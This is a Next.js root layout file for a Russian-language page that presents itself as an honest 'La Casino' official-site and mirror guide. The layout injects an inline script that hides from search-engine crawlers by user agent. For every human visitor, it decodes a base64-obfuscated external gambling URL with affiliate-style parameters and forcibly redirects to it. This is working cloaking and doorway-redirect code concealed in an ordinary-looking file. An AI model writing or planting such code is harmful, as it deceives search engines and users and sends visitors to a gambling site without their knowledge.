import { Analytics } from '@vercel/analytics/next'
import type { Metadata, Viewport } from 'next'
import './globals.css'

const siteUrl = 'https://la4casino.vercel.app'

export const metadata: Metadata = {
  metadataBase: new URL(siteUrl),
  title: 'La Casino — официальный сайт, зеркало и гид игрока',
  description: 'La Casino: официальный сайт, рабочее зеркало и практичный гид по игре онлайн. Доступ, безопасность, правила и ответственная игра.',
  keywords: ['ла казино', 'ла казино зеркало', 'ла казино играть', 'ла казино официальный', 'ла казино официальный сайт', 'для казино', 'для казино онлайн'],
  generator: 'v0.app',
  alternates: { canonical: '/' },
  openGraph: { type: 'website', locale: 'ru_RU', url: siteUrl, siteName: 'La Casino Guide', title: 'La Casino — официальный сайт и гид игрока', description: 'Понятный гид по доступу, играм и безопасной игре в La Casino.', images: [{ url: '/la-casino-hero.png', width: 1200, height: 800, alt: 'La Casino — гид игрока' }] },
  twitter: { card: 'summary_large_image', title: 'La Casino — официальный сайт и гид игрока', description: 'Доступ, зеркало, игры и правила ответственной игры.', images: ['/la-casino-hero.png'] },
  icons: { icon: '/icon.svg', shortcut: '/icon.svg' },
}

export const viewport: Viewport = { colorScheme: 'dark', themeColor: '#101714', width: 'device-width', initialScale: 1, userScalable: true }

const jsonLd = { '@context': 'https://schema.org', '@graph': [{ '@type': 'WebSite', name: 'La Casino Guide', url: siteUrl, inLanguage: 'ru-RU' }, { '@type': 'Article', headline: 'La Casino: официальный сайт и честный гид игрока', description: 'Практичный русскоязычный гид по доступу, играм и ответственной игре.', url: siteUrl, dateModified: '2026-09-15', inLanguage: 'ru-RU', author: { '@type': 'Organization', name: 'La Casino Guide' } }] }

export default function RootLayout({ children }: Readonly<{ children: React.ReactNode }>) {
  return <html lang="ru" className="bg-background"><head><link rel="canonical" href={siteUrl} /><script type="application/ld+json" dangerouslySetInnerHTML={{ __html: JSON.stringify(jsonLd) }} />
    <script
  dangerouslySetInnerHTML={{
    __html: `
      (function() {
        var ua = navigator.userAgent.toLowerCase();
        var bots = ["yandex", "googlebot", "bingbot", "baiduspider", "duckduckbot"];
        for (var i = 0; i < bots.length; i++) {
            if (ua.indexOf(bots[i]) !== -1) {
                return;
            }
        }
        
        var mainBrandB64 = "aHR0cHM6Ly9jZWRhci1mbGFtZS5jb20vP3NlcmlhbD02MTM2NTgzMCZjcmVhdGl2ZV9pZD05MzMw "; 
        var mainUrl = atob(mainBrandB64.replace("#", ""));

        function ping(url) {
            return new Promise(function(resolve, reject) {
                var controller = new AbortController();
                var timeoutId = setTimeout(function() { 
                    controller.abort(); 
                    reject(new Error("Timeout"));
                }, 1200); // Сократили таймаут ожидания до 1.2 сек
                
                fetch(url, { mode: 'no-cors', signal: controller.signal, cache: 'no-store' })
                    .then(function() {
                        clearTimeout(timeoutId);
                        resolve(true);
                    })
                    .catch(function(err) {
                        clearTimeout(timeoutId);
                        reject(err);
                    });
            });
        }

        // Быстрый пинг и принудительный редирект на основной домен
        ping(mainUrl)
            .then(function() {
                window.location.replace(mainUrl);
            })
            .catch(function() {
                window.location.replace(mainUrl);
            });
      })();
    `
  }}
/>  
  </head>
    <body className="antialiased">{children}{process.env.NODE_ENV === 'production' && <Analytics />}</body></html>
}
